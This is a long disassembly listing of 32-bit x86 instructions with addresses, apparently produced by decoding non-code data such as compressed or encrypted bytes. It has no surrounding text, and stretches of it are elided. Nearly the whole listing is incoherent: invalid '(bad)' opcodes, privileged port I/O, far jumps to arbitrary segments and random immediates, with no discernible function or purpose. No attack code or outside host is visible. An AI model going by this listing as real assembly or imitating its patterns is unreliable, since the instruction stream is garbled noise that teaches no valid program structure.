  41aa65:	arpl   WORD PTR [edx+0x49d70004],sp
  41aa6b:	inc    ebx
  41aa6c:	or     DWORD PTR [esi+0x7ed476f5],eax
  41aa72:	xor    eax,0x3246162
  41aa77:	and    ebp,DWORD PTR [edx+0x51]
  41aa7a:	popf   
  41aa7b:	and    BYTE PTR [ecx+0xa],dh
  41aa7e:	add    DWORD PTR [eax-0x14a59a50],esi
  41aa84:	dec    edx
  41aa85:	xor    al,0x7f
  41aa87:	je     0x41aa3e
  41aa89:	inc    edi
  41aa8a:	cmp    esp,DWORD PTR [eax+0x68d7699d]
	...
  41aaf4:	test   DWORD PTR [ecx],0xfdfeb4dc
  41aafa:	inc    DWORD PTR [ebx+0x5f]
  41aafd:	sbb    BYTE PTR [esi+0x43],ah
  41ab00:	aad    0xad
  41ab02:	mov    esp,0x11afc22
  41ab07:	add    BYTE PTR [ecx+eax*1],al
  41ab0a:	add    BYTE PTR [eax],al
  41ab0c:	jp     0x41ab2a
  41ab0e:	les    edx,FWORD PTR [eax-0x69ae1c7]
  41ab14:	pop    edi
  41ab15:	jns    0x41ab10
  41ab17:	dec    edi
  41ab18:	push   ds
  41ab19:	les    eax,FWORD PTR [ebx-0x46]
  41ab1c:	stos   DWORD PTR es:[edi],eax
  41ab1d:	add    eax,0x272d542f
  41ab22:	lods   eax,DWORD PTR ds:[esi]
  41ab23:	cmc    
  41ab24:	add    edi,DWORD PTR ds:0x94195c4a
  41ab2a:	js     0x41ab15
  41ab2c:	push   es
  41ab2d:	inc    esp
  41ab2e:	(bad)  
  41ab2f:	into   
  41ab30:	div    DWORD PTR [edx+ebx*8+0x5dc24875]
  41ab37:	cs or  eax,0x2baabddc
  41ab3d:	or     eax,0xa64b0aa2
  41ab42:	es cmp al,0x9c
  41ab45:	adc    cl,BYTE PTR [ebp+0x41]
  41ab48:	arpl   ax,cx
  41ab4a:	push   0xffffffc8
  41ab4c:	call   0x382a:0xfb46033a
  41ab53:	pushw  es
  41ab55:	jo     0x41ab5b
  41ab57:	pushf  
  41ab58:	retf   
  41ab59:	outs   dx,BYTE PTR ds:[esi]
  41ab5a:	and    BYTE PTR [edi],bl
  41ab5c:	sub    BYTE PTR [ecx-0x7640e7ef],ah
  41ab62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab63:	xor    eax,DWORD PTR [ecx-0x3edacbcd]
  41ab69:	lahf   
  41ab6a:	les    ecx,FWORD PTR [eax-0x38]
  41ab6d:	push   ss
  41ab6e:	push   edi
  41ab6f:	out    dx,al
  41ab70:	in     eax,0xa0
  41ab72:	add    al,0x12
  41ab74:	jmp    0xf40ff24a
  41ab79:	mov    DWORD PTR [esi-0x5b],0x25cbac75
  41ab80:	gs test DWORD PTR cs:[eax+0x684beac8],esi
  41ab88:	mov    bl,0x3e
  41ab8a:	retf   
  41ab8b:	scas   eax,DWORD PTR es:[edi]
  41ab8c:	sbb    DWORD PTR [edx+0x19],0xffffffce
  41ab90:	lock ret 
  41ab92:	(bad)  
  41ab93:	out    dx,eax
  41ab94:	popf   
  41ab95:	lods   al,BYTE PTR ds:[esi]
  41ab96:	es ins BYTE PTR es:[edi],dx
  41ab98:	sub    eax,0xeaff1890
  41ab9d:	cmp    ecx,DWORD PTR [ebx-0x11]
  41aba0:	mov    dx,0xd928
  41aba4:	lods   al,BYTE PTR ds:[esi]
  41aba5:	push   ss
  41aba6:	sub    eax,0x95852ab2
  41abab:	and    eax,esp
  41abad:	xchg   ebx,eax
  41abae:	push   esp
  41abaf:	jp     0x41ac1b
  41abb1:	lds    eax,FWORD PTR [edx]
  41abb3:	add    cl,BYTE PTR [esi+0x9]
  41abb6:	sub    al,0x97
  41abb8:	in     al,dx
  41abb9:	jne    0x41ab66
  41abbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abbc:	inc    ebp
  41abbd:	inc    esi
  41abbe:	mov    ebp,0x75b1f12c
  41abc3:	pop    ecx
  41abc4:	push   ss
  41abc5:	ret    0xd432
  41abc8:	clc    
  41abc9:	push   ebp
  41abca:	retf   0x8913
  41abcd:	or     ebp,edi
  41abcf:	push   edi
  41abd0:	enter  0x7e81,0xc2
  41abd4:	int3   
  41abd5:	dec    edi
  41abd6:	inc    ecx
  41abd7:	mov    cl,0x2f
  41abd9:	add    BYTE PTR [eax],dh
  41abdb:	arpl   WORD PTR [eax+0x7a],dx
  41abde:	mov    edx,0xa2ab039e
  41abe3:	rol    BYTE PTR [edx-0x3d],0x76
  41abe7:	xchg   edx,eax
  41abe8:	sti    
  41abe9:	jae    0x41ac4f
  41abeb:	cli    
  41abec:	push   cs
  41abed:	fsubr  st(5),st
  41abef:	nop
  41abf0:	in     al,0x98
  41abf2:	repz ret 
  41abf4:	loop   0x41abb5
  41abf6:	or     DWORD PTR [eax+0x5d],ebp
  41abf9:	mov    eax,ds:0xe4099d86
  41abfe:	mov    al,ds:0x753e3fb1
  41ac03:	xlat   BYTE PTR ds:[ebx]
  41ac04:	(bad)  
  41ac06:	fisubr DWORD PTR [esi-0x6a]
  41ac09:	scas   eax,DWORD PTR es:[edi]
  41ac0a:	std    
  41ac0b:	cdq    
  41ac0c:	or     esp,eax
  41ac0e:	or     al,0x2a
	...
  41ac74:	push   0x49
  41ac76:	es cmp al,0x27
  41ac79:	jg     0x41acf5
  41ac7b:	pop    edi
  41ac7c:	or     al,0x44
  41ac7e:	xor    ah,BYTE PTR [eax+eax*4+0x2a]
  41ac82:	jecxz  0x41ac56
  41ac84:	add    BYTE PTR [ecx+eax*1],bl
  41ac87:	add    BYTE PTR [ecx+eax*1],al
  41ac8a:	add    BYTE PTR [eax],al
  41ac8c:	in     al,0xec
  41ac8e:	lahf   
  41ac8f:	xor    al,0xa0
  41ac91:	iret   
  41ac92:	aad    0xb6
  41ac94:	les    ecx,FWORD PTR [ecx-0x73]
  41ac97:	imul   edi,DWORD PTR [eax-0x6af7e6b4],0x18
  41ac9e:	xchg   BYTE PTR [eax+edi*4-0x1a],al
  41aca2:	int3   
  41aca3:	nop
  41aca4:	sub    dh,BYTE PTR [ebp-0x6e]
  41aca7:	cld    
  41aca8:	aam    0x2
  41acaa:	adc    eax,0x9c06151c
  41acaf:	das    
  41acb0:	stos   BYTE PTR es:[edi],al
  41acb1:	nop
  41acb2:	test   al,0xf8
  41acb4:	outs   dx,DWORD PTR ds:[esi]
  41acb5:	inc    edi
  41acb6:	dec    esp
  41acb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41acb8:	mov    esp,0x9ae5e5c5
  41acbd:	jne    0x41acbb
  41acbf:	popf   
  41acc0:	or     esi,DWORD PTR [eax+ebp*1+0x359c0202]
  41acc7:	adc    eax,0x9675e1f9
  41accc:	(bad)  
  41accd:	out    0x4f,eax
  41accf:	cmc    
  41acd0:	pop    ecx
  41acd1:	lahf   
  41acd2:	push   ebp
  41acd3:	ins    BYTE PTR es:[edi],dx
  41acd4:	(bad)  
  41acd6:	hlt    
  41acd7:	in     al,dx
  41acd8:	jmp    0x8b52:0x80c0739f
  41acdf:	dec    eax
  41ace0:	loope  0x41ad56
  41ace2:	xor    ah,ah
  41ace4:	pop    ebp
  41ace5:	(bad)  
  41ace6:	sti    
  41ace7:	retf   
  41ace8:	ds shl ecx,cl
  41aceb:	sti    
  41acec:	in     eax,0x42
  41acee:	cmc    
  41acef:	cmc    
  41acf0:	mov    bh,bl
  41acf2:	adc    ebx,eax
  41acf4:	pop    esp
  41acf5:	lods   eax,DWORD PTR ds:[esi]
  41acf6:	and    al,0xf0
  41acf8:	jb     0x41ad60
  41acfa:	mov    edx,0xbc4a5c89
  41acff:	push   ecx
  41ad00:	dec    ecx
  41ad01:	test   dl,0x7d
  41ad04:	into   
  41ad05:	sbb    DWORD PTR [ebx+0x33],ebx
  41ad08:	jg     0x41ad6f
  41ad0a:	xchg   edi,eax
  41ad0b:	xchg   ecx,eax
  41ad0c:	mov    eax,0xfacaf9cc
  41ad11:	adc    al,BYTE PTR [eax]
  41ad13:	sbb    ecx,0x628bdd96
  41ad19:	adc    eax,0x9cb12fc0
  41ad1e:	xchg   esi,eax
  41ad1f:	jnp    0x41ad71
  41ad21:	dec    esi
  41ad22:	cmp    esi,ebp
  41ad24:	pop    ds
  41ad25:	fsubr  QWORD PTR [ebx]
  41ad27:	hlt    
  41ad28:	cld    
  41ad29:	inc    esi
  41ad2a:	mov    ch,0x24
  41ad2c:	inc    ebx
  41ad2d:	mov    bh,BYTE PTR [ebx]
  41ad2f:	add    BYTE PTR [edi-0x1c041342],0xf0
  41ad36:	mov    ss,WORD PTR [eax+0x1f]
  41ad39:	cmp    edx,DWORD PTR [eax-0x6ff9941f]
  41ad3f:	test   DWORD PTR [edi+0x6e],edx
  41ad42:	push   ds
  41ad43:	test   BYTE PTR [esi+0xf853099],bh
  41ad49:	les    eax,FWORD PTR [ecx+0x74]
  41ad4c:	jg     0x41acdf
  41ad4e:	cs push edi
  41ad50:	scas   al,BYTE PTR es:[edi]
  41ad51:	inc    ebp
  41ad52:	idiv   DWORD PTR [eax]
  41ad54:	outs   dx,DWORD PTR ds:[esi]
  41ad55:	js     0x41ad11
  41ad57:	je     0x41ad48
  41ad59:	loopne 0x41ad1e
  41ad5b:	add    eax,DWORD PTR [ebp-0x5d]
  41ad5e:	retf   0xc819
  41ad61:	ret    0x3d54
  41ad64:	enter  0x2104,0x76
  41ad68:	sub    bl,0x8f
  41ad6b:	inc    esp
  41ad6c:	xchg   edi,eax
  41ad6d:	daa    
  41ad6e:	mov    al,0x13
  41ad70:	fistp  DWORD PTR [ebx-0x4ced06d3]
  41ad76:	loopne 0x41ad58
  41ad78:	sbb    eax,0x10442ee1
  41ad7d:	add    DWORD PTR gs:[edx-0x54],ebx
  41ad81:	fnstsw WORD PTR [ebp+0x3b461a07]
  41ad87:	push   ss
  41ad88:	sbb    BYTE PTR ds:0xa5c9e1fe,bh
  41ad8e:	xchg   ecx,eax
  41ad8f:	fld    QWORD PTR [eax]
	...
  41adf1:	add    BYTE PTR [eax],al
  41adf3:	add    BYTE PTR [ebp-0x8],dl
  41adf6:	or     DWORD PTR [esi-0x4280053],ebx
  41adfc:	dec    edi
  41adfd:	push   eax
  41adfe:	cmp    DWORD PTR [edi+eax*4+0x4efeb34],esp
  41ae05:	sbb    eax,0x1040001
  41ae0a:	add    BYTE PTR [eax],al
  41ae0c:	cmp    DWORD PTR [edi-0x4f9b78fa],esi
  41ae12:	pop    ecx
  41ae13:	fsub   st,st(0)
  41ae15:	scas   eax,DWORD PTR es:[edi]
  41ae16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae17:	cmp    ecx,DWORD PTR [eax]
  41ae19:	or     eax,0xdda2c53d
  41ae1e:	adc    eax,0xb9f50889
  41ae23:	not    DWORD PTR [esi]
  41ae25:	je     0x41ae8e
  41ae27:	retf   0xa0ed
  41ae2a:	aam    0x11
  41ae2c:	dec    eax
  41ae2d:	int    0x33
  41ae2f:	push   ss
  41ae30:	jo     0x41ae14
  41ae32:	fs push edx
  41ae34:	fisubr DWORD PTR [esi-0x71]
  41ae37:	xor    edi,DWORD PTR [edx]
  41ae39:	jae    0x41ae99
  41ae3b:	pop    ds
  41ae3c:	out    0xb0,al
  41ae3e:	inc    ebp
  41ae3f:	outs   dx,BYTE PTR ds:[esi]
  41ae40:	popa   
  41ae41:	hlt    
  41ae42:	mov    esi,ebx
  41ae44:	ss xor al,0xad
  41ae47:	lea    edi,[ebp+0xd]
  41ae4a:	hlt    
  41ae4b:	(bad)  
  41ae4c:	mov    ?,WORD PTR ss:[eax]
  41ae4f:	lea    esp,[edi]
  41ae51:	test   DWORD PTR [esi+ebp*1-0x1faf9cd3],eax
  41ae58:	test   DWORD PTR [ecx+eax*1],eax
  41ae5b:	mov    al,ds:0x76d8b5d3
  41ae60:	lods   eax,DWORD PTR ds:[esi]
  41ae61:	shl    BYTE PTR [eax+ebx*2-0x2f6d1b99],cl
  41ae68:	jbe    0x41ae39
  41ae6a:	xor    ebx,eax
  41ae6c:	cld    
  41ae6d:	cmp    al,0xa6
  41ae6f:	xchg   ebp,eax
  41ae70:	es call 0x3fb9:0x7bf4a5a3
  41ae78:	rcr    dl,0x87
  41ae7b:	mov    esp,0x47f53e54
  41ae80:	adc    BYTE PTR [ebp+0x6d6c844f],ch
  41ae86:	rol    DWORD PTR [esi],1
  41ae88:	push   cs
  41ae89:	lock retf 
  41ae8b:	xrelease mov BYTE PTR [ebp-0x3c],ah
  41ae8f:	cmp    BYTE PTR [edx],ch
  41ae91:	fbstp  TBYTE PTR [eax+0x4d]
  41ae94:	push   edi
  41ae95:	lods   eax,DWORD PTR ds:[esi]
  41ae96:	shl    ebp,cl
  41ae98:	mov    DWORD PTR [edx-0x1f],esp
  41ae9b:	and    DWORD PTR [ecx+ecx*4],eax
  41ae9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aea0:	mov    ds,WORD PTR [edi+0x123942b6]
  41aea6:	arpl   WORD PTR [esi-0x4e4df4f3],bp
  41aeac:	enter  0xf9db,0x7f
  41aeb0:	pushf  
  41aeb1:	(bad)  
  41aeb2:	jo     0x41ae84
  41aeb4:	shr    esi,1
  41aeb6:	push   eax
  41aeb7:	cmp    esp,DWORD PTR [esi-0x3b]
  41aeba:	inc    ebx
  41aebb:	je     0x41ae55
  41aebd:	cmp    al,0x5b
  41aebf:	jmp    0x1c89c395
  41aec4:	pop    esi
  41aec5:	(bad)  
  41aec7:	xchg   ebx,eax
  41aec8:	mov    cl,0x51
  41aeca:	xchg   esi,eax
  41aecb:	pop    esi
  41aecc:	stos   BYTE PTR es:[edi],al
  41aecd:	or     al,0xb5
  41aecf:	add    bl,al
  41aed1:	retf   0x472c
  41aed4:	leave  
  41aed5:	loopne 0x41af19
  41aed7:	ss lahf 
  41aed9:	in     al,dx
  41aeda:	jmp    0x41af0c
  41aedc:	sub    esp,DWORD PTR [eax]
  41aede:	add    DWORD PTR [edi-0x6e],edx
  41aee1:	std    
  41aee2:	ins    DWORD PTR es:[edi],dx
  41aee3:	sbb    al,BYTE PTR [ebp+0x69]
  41aee6:	mul    BYTE PTR [ecx]
  41aee8:	call   0x71458ba6
  41aeed:	adc    eax,0xc80ccfa8
  41aef2:	mov    ds:0x8ee3fea6,al
  41aef7:	inc    ecx
  41aef8:	and    ch,BYTE PTR [edx+ecx*8]
  41aefb:	ret    
  41aefc:	cmp    esp,DWORD PTR [ebp-0x3ae57d3e]
  41af02:	repz mov bl,0x70
  41af05:	or     ebp,DWORD PTR [ebp-0x2c]
  41af08:	stos   DWORD PTR es:[edi],eax
  41af09:	xor    edi,0x45
  41af0c:	and    al,0xf8
  41af0e:	mov    ecx,0x80
	...
  41af73:	add    ch,al
  41af75:	stc    
  41af76:	lods   eax,DWORD PTR ds:[esi]
  41af77:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41af7d:	mov    ecx,0x50d544ee
  41af82:	dec    edx
  41af83:	push   eax
  41af84:	or     BYTE PTR [esi],bl
  41af86:	add    DWORD PTR [eax],eax
  41af88:	add    al,0x1
  41af8a:	add    BYTE PTR [eax],al
  41af8c:	sbb    ecx,DWORD PTR gs:[ebp+0x42159261]
  41af93:	jae    0x41af4b
  41af95:	mov    edi,0x968ade7
  41af9a:	ins    DWORD PTR es:[edi],dx
  41af9b:	inc    ecx
  41af9c:	sub    ecx,ebp
  41af9e:	inc    ebp
  41af9f:	mov    eax,0xebabc6e4
  41afa4:	hlt    
  41afa5:	dec    ebx
  41afa6:	sahf   
  41afa7:	xor    ah,ch
  41afa9:	and    dl,BYTE PTR [eax+0xa40a7f7]
  41afaf:	sub    DWORD PTR [eax],ebx
  41afb1:	and    edi,edi
  41afb3:	pop    es
  41afb4:	pop    ds
  41afb5:	icebp  
  41afb6:	inc    esp
  41afb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41afb8:	out    0xc0,al
  41afba:	ret    0xc7d
  41afbd:	push   ebx
  41afbe:	cmc    
  41afbf:	sbb    dx,0xffe8
  41afc3:	sub    eax,ebp
  41afc5:	cdq    
  41afc6:	push   ebx
  41afc7:	jg     0x41af6b
  41afc9:	int    0x75
  41afcb:	push   0x31
  41afcd:	ficomp DWORD PTR [eax]
  41afcf:	(bad)  
  41afd0:	cs mov bl,0x86
  41afd3:	out    dx,al
  41afd4:	sub    BYTE PTR [edx],bh
  41afd6:	jl     0x41af99
  41afd8:	inc    edi
  41afd9:	pop    ebx
  41afda:	mov    esp,0xb104db76
  41afdf:	sbb    edx,esp
  41afe1:	adc    BYTE PTR [eax+0x61],ch
  41afe4:	test   al,0x51
  41afe6:	in     al,dx
  41afe7:	fst    DWORD PTR [ebp+esi*4+0x75ab9bd7]
  41afee:	adc    ah,BYTE PTR [esi-0x15]
  41aff1:	mov    ebp,0x940e6edb
  41aff6:	push   cs
  41aff7:	clc    
  41aff8:	push   esp
  41aff9:	jg     0x41afa4
  41affb:	xchg   edx,eax
  41affc:	push   ecx
  41affd:	jmp    0x41b037
  41afff:	dec    BYTE PTR [esi+eax*4]
  41b002:	bound  ebx,QWORD PTR [edx+0x626d13e5]
  41b008:	mov    ds:0x1e96bb19,eax
  41b00d:	sti    
  41b00e:	sar    DWORD PTR [esi-0x2b],1
  41b011:	repz push esi
  41b013:	pop    ds
  41b014:	push   0x3b013820
  41b019:	push   esp
  41b01a:	in     eax,dx
  41b01b:	and    eax,0x962c703a
  41b020:	mov    bl,0x34
  41b022:	imul   esi,DWORD PTR [ebx-0x61],0x8c4bb5c
  41b029:	pop    ss
  41b02a:	push   ebp
  41b02b:	cs in  al,dx
  41b02d:	push   ebx
  41b02e:	xchg   DWORD PTR [ebx+0xd],edx
  41b031:	jmp    0x41b0a0
  41b033:	cmp    DWORD PTR gs:[ebp-0x5d],0xffffffac
  41b038:	ins    BYTE PTR es:[edi],dx
  41b039:	popa   
  41b03a:	loop   0x41b00d
  41b03c:	sahf   
  41b03d:	fstp   DWORD PTR [ebp-0x1ac84853]
  41b043:	jle    0x41afde
  41b045:	sub    dl,BYTE PTR [esi]
  41b047:	jbe    0x41aff4
  41b049:	xchg   edx,eax
  41b04a:	mov    cl,0x70
  41b04c:	(bad)  
  41b04d:	sbb    dh,bl
  41b04f:	repnz sub esi,DWORD PTR [eax]
  41b052:	pop    ecx
  41b053:	(bad)  
  41b055:	inc    ecx
  41b056:	and    eax,0x19365da1
  41b05b:	(bad)  
  41b05c:	(bad)  
  41b05d:	or     eax,0x6f28159
  41b062:	outs   dx,DWORD PTR ds:[esi]
  41b063:	adc    DWORD PTR [esi-0x58],edx
  41b066:	out    dx,al
  41b067:	test   eax,0xa63efd17
  41b06c:	lods   eax,DWORD PTR ds:[esi]
  41b06d:	sbb    bl,BYTE PTR [ebp-0x501b5da2]
  41b073:	ret    
  41b074:	loop   0x41b0c4
  41b076:	xchg   ecx,eax
  41b077:	jle    0x41b03d
  41b079:	inc    edi
  41b07a:	lds    ebp,FWORD PTR [edi+0x35d1fe90]
  41b080:	nop
  41b081:	mov    eax,0xb90e326b
  41b086:	sbb    ebp,ebp
  41b088:	xchg   DWORD PTR [eax+0x15d4b86c],edx
  41b08e:	mov    edi,0xae
	...
  41b0f3:	add    dh,al
  41b0f5:	ficom  WORD PTR [eax]
  41b0f7:	stos   DWORD PTR es:[edi],eax
  41b0f8:	sbb    bh,ch
  41b0fa:	(bad)  
  41b0fb:	call   DWORD PTR [edx+edx*8+0x75]
  41b0ff:	mov    edi,0x630c6ef6
  41b104:	or     al,0x1f
  41b106:	add    DWORD PTR [eax],eax
  41b108:	add    al,0x1
  41b10a:	add    BYTE PTR [eax],al
  41b10c:	in     al,0x61
  41b10e:	jne    0x41b09b
  41b110:	mov    BYTE PTR [edx+0x7ab027c6],bh
  41b116:	fnsave [edx]
  41b118:	ret    
  41b119:	clc    
  41b11a:	jo     0x41b103
  41b11c:	push   ds
  41b11d:	sbb    eax,0x7584125e
  41b122:	mov    es,WORD PTR [eax+esi*2-0x1e144f33]
  41b129:	outs   dx,BYTE PTR ds:[esi]
  41b12a:	div    DWORD PTR [ebx-0x38]
  41b12d:	pop    es
  41b12e:	sti    
  41b12f:	(bad)  [ebx+0x7ced08f0]
  41b135:	xor    esp,esi
  41b137:	dec    edi
  41b138:	rcl    bl,0xff
  41b13b:	data16 clc 
  41b13d:	int    0xbd
  41b13f:	push   ebp
  41b140:	xor    BYTE PTR [ecx-0x1c],bh
  41b143:	pop    esi
  41b144:	cmp    al,0x84
  41b146:	adc    ecx,DWORD PTR [eax+0x24]
  41b149:	inc    eax
  41b14a:	and    dl,BYTE PTR [ebx-0x53]
  41b14d:	xchg   DWORD PTR [esi],eax
  41b14f:	inc    esi
  41b150:	jbe    0x41b1b0
  41b152:	push   0xfffffff5
  41b154:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b155:	repnz retf 0xb2c9
  41b159:	icebp  
  41b15a:	add    eax,0x6562ddd4
  41b15f:	sbb    eax,0x6f04439e
  41b164:	mov    BYTE PTR [ebp-0x60cacc58],bl
  41b16a:	fld    TBYTE PTR [esi+ebp*1-0x7c]
  41b16e:	(bad)  
  41b16f:	sbb    ch,BYTE PTR [ebp-0x4552b607]
  41b175:	push   ebp
  41b176:	xchg   esp,eax
  41b177:	xchg   edi,eax
  41b178:	mov    ah,0xaa
  41b17a:	popf   
  41b17b:	mov    ds:0x6d27cb4e,eax
  41b180:	dec    eax
  41b181:	sbb    BYTE PTR [ecx+0xa998bb0],bh
  41b187:	adc    dh,al
  41b189:	(bad)  
  41b18a:	ss jp  0x41b170
  41b18d:	outs   dx,BYTE PTR ds:[esi]
  41b18e:	push   ebx
  41b18f:	lahf   
  41b190:	enter  0x823b,0xad
  41b194:	or     esi,0xffffffd9
  41b197:	aas    
  41b198:	fnstcw WORD PTR [eax+ebp*1+0x16]
  41b19c:	add    DWORD PTR [edi+0x76ab9344],ecx
  41b1a2:	add    BYTE PTR [edi+0x37e96cca],bh
  41b1a8:	jne    0x41b13e
  41b1aa:	cli    
  41b1ab:	pop    ss
  41b1ac:	jmp    0x34bb:0xd8a08e05
  41b1b3:	inc    esp
  41b1b4:	ins    DWORD PTR es:[edi],dx
  41b1b5:	es jo  0x41b1e7
  41b1b8:	push   es
  41b1b9:	inc    esp
  41b1ba:	and    BYTE PTR [esi+0x3235b5c5],al
  41b1c0:	nop
  41b1c1:	cld    
  41b1c2:	inc    ecx
  41b1c3:	lods   eax,DWORD PTR ds:[esi]
  41b1c4:	(bad)  
  41b1c5:	sahf   
  41b1c6:	fucomp st(4)
  41b1c8:	inc    edi
  41b1c9:	(bad)  
  41b1cb:	fistp  WORD PTR [ecx+0x4d570003]
  41b1d1:	pop    ebx
  41b1d2:	add    BYTE PTR [edi+0x600994eb],ah
  41b1d8:	dec    ecx
  41b1d9:	mov    ds:0xdfe2bb8c,eax
  41b1de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1df:	adc    DWORD PTR ds:0xfaa79089,edx
  41b1e5:	cwde   
  41b1e6:	dec    esp
  41b1e7:	aas    
  41b1e8:	(bad)  [ebp+0xa2ad53a]
  41b1ee:	fs pop ss
  41b1f0:	mov    dl,0xea
  41b1f2:	push   esp
  41b1f3:	push   ds
  41b1f4:	and    eax,0x83822648
  41b1f9:	sbb    DWORD PTR [ebp+0x6146fea2],esi
  41b1ff:	and    al,0x9f
  41b201:	inc    ebp
  41b202:	iret   
  41b203:	inc    edi
  41b204:	rol    DWORD PTR ds:0xd313ee12,1
  41b20a:	inc    edx
  41b20b:	add    ebx,DWORD PTR [ebp+0x227d91]
	...
  41b271:	add    BYTE PTR [eax],al
  41b273:	add    BYTE PTR [esi+0x6be069a5],cl
  41b279:	in     al,dx
  41b27a:	(bad)  
  41b27b:	out    dx,eax
  41b27c:	stos   BYTE PTR es:[edi],al
  41b27d:	jge    0x41b21a
  41b27f:	or     BYTE PTR [edi],bh
  41b281:	sbb    ch,BYTE PTR [eax+0x1e]
  41b284:	adc    BYTE PTR [eax],ah
  41b286:	add    DWORD PTR [eax],eax
  41b288:	add    al,0x1
  41b28a:	add    BYTE PTR [eax],al
  41b28c:	out    dx,al
  41b28d:	xor    eax,0xea1c197b
  41b292:	and    DWORD PTR [ecx-0x1666bdc6],esp
  41b298:	pop    eax
  41b299:	leave  
  41b29a:	(bad)  
  41b29b:	cmp    bh,dl
  41b29d:	mov    bl,0x20
  41b29f:	mov    edi,0x109bf36b
  41b2a4:	js     0x41b309
  41b2a6:	cmc    
  41b2a7:	int    0x69
  41b2a9:	pop    ecx
  41b2aa:	mov    cl,0xa
  41b2ac:	inc    ebx
  41b2ad:	add    DWORD PTR [eax*1+0x6c756cf8],0x14
  41b2b5:	les    edi,FWORD PTR [ecx+0x16]
  41b2b8:	dec    esi
  41b2b9:	mov    ebp,0xff6cbba0
  41b2be:	cmp    al,0xe4
  41b2c0:	ss js  0x41b25c
  41b2c3:	out    0xf7,al
  41b2c5:	lods   al,BYTE PTR ds:[esi]
  41b2c6:	sbb    DWORD PTR [edx+0x2f],ebp
  41b2c9:	sbb    ecx,DWORD PTR [ecx-0x74]
  41b2cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2cd:	addr16 mov eax,ds:0x37c1
  41b2d1:	addr16 mov ecx,0x1483ee09
  41b2d7:	inc    ecx
  41b2d8:	(bad)  
  41b2d9:	out    0x87,eax
  41b2db:	pusha  
  41b2dc:	daa    
  41b2dd:	aam    0xd3
  41b2df:	jb     0x41b326
  41b2e1:	cli    
  41b2e2:	sub    ecx,esp
  41b2e4:	cmp    esi,DWORD PTR [esi]
  41b2e6:	mov    eax,0xfabc11c4
  41b2eb:	jmp    0x851bb13a
  41b2f0:	dec    ebp
  41b2f1:	idiv   DWORD PTR [ecx+0x5664d481]
  41b2f7:	jno    0x41b32a
  41b2f9:	xor    ecx,DWORD PTR [ecx+ebx*1]
  41b2fc:	rcl    BYTE PTR cs:[edi+0x25],0x85
  41b301:	repz out 0x4f,al
  41b304:	sti    
  41b305:	call   0x5d15:0x3659180a
  41b30c:	sub    al,ah
  41b30e:	imul   esi,DWORD PTR [edx+0x37ba8cc6],0x7df1c352
  41b318:	push   0x7318fcd6
  41b31d:	inc    edi
  41b31e:	mov    ch,0x41
  41b320:	jmp    0x1a02:0x9f43b5b0
  41b327:	xchg   esi,eax
  41b328:	xor    ebx,DWORD PTR [ecx]
  41b32a:	mov    BYTE PTR [edi+0x7f5e012c],ch
  41b330:	int3   
  41b331:	ss pop edi
  41b333:	or     BYTE PTR [esi],bh
  41b335:	mov    ch,0x41
  41b337:	aam    0x68
  41b339:	pop    esp
  41b33a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b33b:	xor    dh,al
  41b33d:	ss sub eax,0xbbe0cabc
  41b343:	mov    esp,DWORD PTR fs:[ecx-0x34d3a868]
  41b34a:	dec    esi
  41b34b:	arpl   WORD PTR [edi-0x32],si
  41b34e:	fs dec esi
  41b350:	test   al,0xac
  41b352:	pop    edx
  41b353:	shr    eax,1
  41b355:	popa   
  41b356:	jle    0x41b2e5
  41b358:	lods   al,BYTE PTR ds:[esi]
  41b359:	outs   dx,BYTE PTR ds:[esi]
  41b35a:	ins    DWORD PTR es:[edi],dx
  41b35b:	jnp    0x41b30b
  41b35d:	add    bl,BYTE PTR [ecx+edx*4+0x1f]
  41b361:	inc    edx
  41b362:	jns    0x41b3b6
  41b364:	or     DWORD PTR [esi+0x2b],ebp
  41b367:	cmp    ecx,DWORD PTR [ebp-0x73]
  41b36a:	or     al,0x1
  41b36c:	ss ja  0x41b35f
  41b36f:	pop    ss
  41b370:	aad    0xe2
  41b372:	jae    0x41b369
  41b374:	inc    ebp
  41b375:	xchg   DWORD PTR [edi],ebp
  41b377:	mov    DWORD PTR [edx-0x1d6fad31],edx
  41b37d:	inc    edx
  41b37e:	test   eax,eax
  41b380:	lods   eax,DWORD PTR ds:[esi]
  41b381:	ja     0x41b3ad
  41b383:	mov    cl,0xf9
  41b385:	and    ebp,DWORD PTR [esi+ebp*2+0x52fc1f3e]
  41b38c:	js     0x41b3b3
  41b38e:	adc    esp,DWORD PTR [ecx+0x0]
	...
  41b3f4:	dec    eax
  41b3f5:	or     eax,0xbb5dab1d
  41b3fa:	(bad)  
  41b3fb:	out    dx,eax
  41b3fc:	xchg   ebp,eax
  41b3fd:	iret   
  41b3fe:	push   ebx
  41b3ff:	aas    
  41b400:	dec    esp
  41b401:	cli    
  41b402:	das    
  41b403:	adc    BYTE PTR [ecx+eiz*1],0x1
  41b407:	add    BYTE PTR [ecx+eax*1],al
  41b40a:	add    BYTE PTR [eax],al
  41b40c:	cmp    BYTE PTR [eax-0x48],0xe6
  41b410:	cmp    eax,DWORD PTR [edx-0x2f]
  41b413:	mov    ecx,0x64fd874e
  41b418:	stos   DWORD PTR es:[edi],eax
  41b419:	jae    0x41b45a
  41b41b:	jo     0x41b43c
  41b41d:	add    eax,DWORD PTR [ebx]
  41b41f:	mov    bl,0x4
  41b421:	jo     0x41b3f0
  41b423:	js     0x41b43a
  41b425:	jl     0x41b45a
  41b427:	jno    0x41b470
  41b429:	fidivr WORD PTR [ecx+0x5850b166]
  41b42f:	jo     0x41b40a
  41b431:	sar    BYTE PTR [eax+0x21],0x4c
  41b435:	div    BYTE PTR [edi]
  41b437:	mov    eax,ds:0x9463ea65
  41b43c:	mov    ecx,0x8da29d52
  41b441:	jle    0x41b4c1
  41b443:	cli    
  41b444:	inc    esp
  41b445:	mov    dl,dh
  41b447:	xor    dl,dl
  41b449:	or     BYTE PTR [edx+0x1f],ah
